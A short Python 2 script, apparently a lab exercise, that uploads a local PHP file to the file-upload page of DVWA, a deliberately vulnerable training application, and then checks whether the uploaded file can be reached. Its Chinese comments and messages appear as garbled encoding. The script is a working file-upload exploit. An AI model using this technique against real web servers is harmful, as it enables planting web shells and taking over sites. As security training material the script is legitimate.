#�˴��ϴ����ļ�·��λ��D����
#ip��ַΪ192.168.0.105


import sys
import requests


argc = len(sys.argv) - 1
argv = sys.argv[1:]
if argc == -1 or argc > 2:
    print "�÷���python",sys.argv[0],"IP��ַ �˿ں�"
    print "���磺urlΪhttp://127.0.0.1:8080/����IP��ַӦΪ127.0.0.1���˿ں�ӦΪ8080"
    sys.exit()

ip = "192.168.109.147"
port = "80"

if argc >= 1:
    ip = argv[0]
if argc == 2:
    port = argv[1]
	
url="http://"+ip+":"+port+"/DVWA-master/vulnerabilities/upload/"
data=None
files={'file':open(r'D:\php.php','rb')}
h=requests.post(url=url,data=data,files=files)
code=requests.get("http://"+ip+"/DVWA-master/hackable/uploads/php.php").status_code
if code == 200:
    print "�ļ��ϴ��ɹ�"
else:
    print "�ļ��ϴ�ʧ��"
